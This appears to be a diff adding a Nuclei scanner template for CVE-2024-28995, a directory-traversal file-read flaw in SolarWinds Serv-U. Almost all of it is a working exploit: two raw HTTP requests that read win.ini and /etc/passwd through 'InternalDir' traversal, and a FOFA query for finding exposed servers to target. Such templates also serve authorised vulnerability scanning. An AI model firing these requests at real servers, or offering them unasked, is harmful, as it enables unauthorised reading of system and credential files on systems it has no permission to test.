@@ -1,0 +1,42 @@
+id: SolarWinds-Serv-U-fileread
+info:
+  name: SolarWinds Serv-U 目录遍历z导致任意文件读取(CVE-2024-28995)
+  author: xx
+  severity: high
+  description: SolarWinds Serv-U 目录遍历导致任意文件读取(CVE-2024-28995)
+  metadata:
+    fofa-query: body="http://www.Serv-U.com"
+  tags: Serv-U,fileread
+
+http:
+  - raw:
+      - |
+        GET /?InternalDir=/../../../../windows&InternalFile=win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "fonts"
+        part: body
+      
+  - raw:
+      - |
+        GET /?InternalDir=\..\..\..\..\etc&InternalFile=passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root"
+        part: body
